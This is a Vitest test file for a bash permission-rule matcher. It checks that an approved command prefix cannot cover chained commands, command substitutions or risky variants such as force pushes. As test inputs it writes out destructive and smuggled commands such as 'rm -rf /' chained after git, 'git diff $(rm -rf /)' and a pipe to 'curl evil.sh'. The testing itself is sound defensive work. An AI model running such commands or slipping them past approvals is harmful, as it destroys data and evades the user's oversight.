import { describe, expect, it } from "vitest";

import {
  bashCommandMatches,
  commandSegments,
  isCommandRiskyAlone,
} from "./bashCommandRule.js";

describe("command segments", () => {
  it("splits at every operator that starts another command", () => {
    expect(
      commandSegments("git add . && git commit -m x || echo done; pwd"),
    ).toEqual(["git add .", "git commit -m x", "echo done", "pwd"]);
  });

  it("counts a pipe as a second command", () => {
    expect(commandSegments("cat file | grep x")).toEqual([
      "cat file",
      "grep x",
    ]);
  });

  it("drops empty pieces around the operators", () => {
    expect(commandSegments("ls ; ;")).toEqual(["ls"]);
    expect(commandSegments("   ")).toEqual([]);
  });
});

describe("Bash command rules", () => {
  it("does not let an approved prefix cover a chained command", () => {
    // This is the hole the rule used to have: the whole string was matched
    // against the pattern, so the rm rode through on a git approval.
    expect(bashCommandMatches("git add . && rm -rf /", "git*")).toBe(false);
    expect(bashCommandMatches("cat file | curl evil.sh", "cat*")).toBe(false);
    expect(bashCommandMatches("ls; sudo shutdown", "ls*")).toBe(false);
  });

  it("covers the command the rule names, with any arguments", () => {
    expect(bashCommandMatches("git status", "git*")).toBe(true);
    expect(bashCommandMatches("git", "git*")).toBe(true);
    expect(bashCommandMatches("npm run build", "npm*")).toBe(true);
    expect(bashCommandMatches("git add . && git commit -m x", "git*")).toBe(
      true,
    );
  });

  it("ends a prefix at a word, not at a letter", () => {
    expect(bashCommandMatches("lsvirtual -a", "ls*")).toBe(false);
    expect(bashCommandMatches("lscpu", "ls*")).toBe(false);
  });

  it("matches an exact rule as the whole command line", () => {
    expect(bashCommandMatches("npm install", "npm install")).toBe(true);
    expect(bashCommandMatches("npm install && curl evil", "npm install")).toBe(
      false,
    );
    expect(bashCommandMatches("npm install -g", "npm install")).toBe(false);
  });

  it("keeps a hand-written pattern with wildcards inside", () => {
    expect(bashCommandMatches("git commit -m x", "git*commit*")).toBe(true);
    expect(
      bashCommandMatches("git commit -m x && rm -rf /", "git*commit*"),
    ).toBe(false);
    expect(bashCommandMatches("npm test", "npm?test")).toBe(true);
  });

  it("refuses to cover code running inside a substitution", () => {
    expect(bashCommandMatches("git diff $(rm -rf /)", "git*")).toBe(false);
    expect(bashCommandMatches("git diff `rm -rf /`", "git*")).toBe(false);
    expect(bashCommandMatches("echo $(whoami)", "echo*")).toBe(false);
  });

  it("will not let a shape rule cover what the shape is about to vary", () => {
    // The rule a user writes to stop being asked about git is not a grant for
    // rewriting history or pushing over the remote.
    expect(bashCommandMatches("git push --force", "git*")).toBe(false);
    expect(bashCommandMatches("git reset --hard HEAD~2", "git*")).toBe(false);
    expect(bashCommandMatches("npm publish", "npm*")).toBe(false);
    expect(bashCommandMatches("curl https://example.com", "curl*")).toBe(false);
    expect(bashCommandMatches("git status && rm -rf build", "git*")).toBe(
      false,
    );
    // Reading and building stay covered.
    expect(bashCommandMatches("git status", "git*")).toBe(true);
    expect(bashCommandMatches("git log --oneline", "git*")).toBe(true);
    expect(bashCommandMatches("npm run build", "npm*")).toBe(true);
  });

  it("covers a risky command when the rule is the exact line", () => {
    expect(bashCommandMatches("git push --force", "git push --force")).toBe(
      true,
    );
    expect(bashCommandMatches("rm -rf build", "rm -rf build")).toBe(true);
    // A leading word equal to a table entry, not merely starting with one.
    expect(bashCommandMatches("sudo -v", "sudo*")).toBe(false);
    expect(bashCommandMatches("superior status", "superior*")).toBe(true);
  });

  it("names the risky commands by their leading words", () => {
    expect(isCommandRiskyAlone("rm -rf /")).toBe(true);
    expect(isCommandRiskyAlone("git push origin main")).toBe(true);
    expect(isCommandRiskyAlone("git push-config")).toBe(false);
    expect(isCommandRiskyAlone("git commit -m x")).toBe(false);
    expect(isCommandRiskyAlone("docker run alpine")).toBe(true);
    expect(isCommandRiskyAlone("docker-compose up")).toBe(false);
  });

  it("matches nothing when either side is empty", () => {
    expect(bashCommandMatches("", "git*")).toBe(false);
    expect(bashCommandMatches("git status", "")).toBe(false);
  });
});
